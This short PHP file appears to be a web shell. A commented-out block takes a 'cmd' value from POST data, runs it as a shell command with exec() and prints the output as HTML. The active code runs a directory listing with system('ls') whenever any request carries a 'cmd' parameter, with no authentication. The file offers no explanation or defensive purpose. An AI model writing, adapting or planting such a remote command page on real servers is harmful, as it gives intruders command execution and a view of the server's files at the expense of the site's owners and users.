<?php
$htmlResp = "";
//var_dump($_POST);
/*
if (isset($_POST['exec'])) {

    exec($_POST['cmd'], $result);

    $htmlResp .= '----------------- < OutPut > -----------------';
    $htmlResp .= '<pre>';
    foreach ($result as $print) {
        $print = str_replace('<', '&lt;', $print);
        $htmlResp .= $print . '<br>';
    }
    $htmlResp .= '</pre>';
} else {
    $htmlResp = '<br>';
}*/
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system("ls");
    echo "</pre>";
}